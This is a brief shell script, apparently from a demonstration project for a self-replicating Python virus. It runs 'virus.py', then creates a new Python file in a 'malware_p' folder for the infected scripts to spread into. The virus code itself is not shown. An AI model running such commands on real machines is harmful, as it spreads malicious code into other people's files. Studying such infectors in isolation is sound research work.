pip install emlx
# Run original virus script
python virus.py
# Run infected scripts and they will infect other newly created python scripts
# shellcheck disable=SC2164
cd ./malware_p
touch s1.py
python p3.py
